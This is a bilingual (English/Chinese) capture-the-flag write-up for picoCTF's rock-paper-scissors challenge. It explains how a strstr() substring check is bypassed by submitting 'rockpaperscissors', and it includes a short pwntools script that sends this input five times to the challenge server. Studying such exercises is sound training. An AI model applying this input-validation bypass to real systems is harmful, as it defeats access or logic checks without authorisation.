# RPS

## Inforamtion

### Description

Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.
Connect to the program with netcat:
$ nc saturn.picoctf.net 56981
The program's source code with the flag redacted can be downloaded here.

### Hints

How does the program check if you won?

## Soliution

1. Discovery
 
2. Research
    * 觀察程式可以發現，當在比較時是透過 `strstr()` 做比較。
    * `strstr()`: Returns a pointer to the first occurrence of str2 in str1, or a null pointer if str2 is not part of str1.
        * 表示只要 str2 是 str1 的一部分就不會回傳 NULL。 
        ```c
            const char * strstr ( const char * str1, const char * str2 );
        ```
    * 可以發現輸入是使用 `read()` ，表示可以任意輸入固定大小。
    * 輸入繞過 `strstr()`( 5 次)，使所有可能輸入串再一起，則不論電腦為任一選項都會成功達成勝利條件。
        * payload = rockpaperscissors

3. Exploitation
    ```py
        #! /usr/bin/env python

        from pwn import *
            
        # nc saturn.picoctf.net 56981
        p = remote(host='saturn.picoctf.net', port=56981)

        payload = b'rockpaperscissors'

        for _ in range(5):
            p.sendlineafter(b"Type '2' to exit the program", b'1')
            p.sendlineafter(b'Please make your selection (rock/paper/scissors):', payload)
            
        log.info(p.recvall())

    ```
